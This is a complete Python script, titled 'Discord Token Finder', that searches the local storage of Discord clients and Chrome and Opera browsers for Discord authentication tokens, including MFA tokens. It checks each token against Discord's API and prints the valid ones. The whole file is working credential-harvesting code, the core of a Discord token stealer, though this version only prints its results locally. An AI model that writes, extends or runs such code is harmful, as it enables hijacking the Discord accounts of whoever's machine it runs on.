try:
    import colorama
    import os
    import ctypes
except ModuleNotFoundError as e:
    modulename = str(e).split("No module named ")[1].replace("'", "")
    input(f"Please install module with: pip install {modulename}")
    exit()

from colorama import Fore, init
import requests
import re
import os

init(convert=True)


def main():

    tokens = []

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = [f"{ROAMING}\\discord\\Local Storage\\leveldb",
             f"{ROAMING}\\discordcanary\\leveldb",
             f"{ROAMING}\\discordptb\\Local Storage\\leveldb",
             f"{LOCAL}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
             f"{ROAMING}\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
             f"{ROAMING}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
             f"{ROAMING}\\Lightcord\\Local Storage\\leveldb"]

    for path in PATHS:
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        except:
            pass

    if tokens:
        tokens = list(dict.fromkeys(tokens))

        valid = []
        invalid = []

        for token in tokens:
            if requests.get(
                    'https://discordapp.com/api/v9/users/@me', headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }).status_code == 200:
                valid.append(f"- {token}")
            else:
                invalid.append(f"- {token}")

        print(f"{Fore.GREEN}Valid Tokens Founds:{Fore.RESET}")
        print("\n".join(valid) if valid else "No tokens found...\n")

        print(f"{Fore.RED}\nInvalid Tokens Founds:{Fore.RESET}")
        print("\n".join(invalid)
              if invalid else "No tokens found...")

    else:
        print(f"{Fore.RED}No tokens found...{Fore.RESET}")

    print()
    os.system("pause")
    os.system("exit")


if __name__ == "__main__":
    ctypes.windll.kernel32.SetConsoleTitleW(
        "Discord Token Finder | v0.1 | By Tayz")
    main()
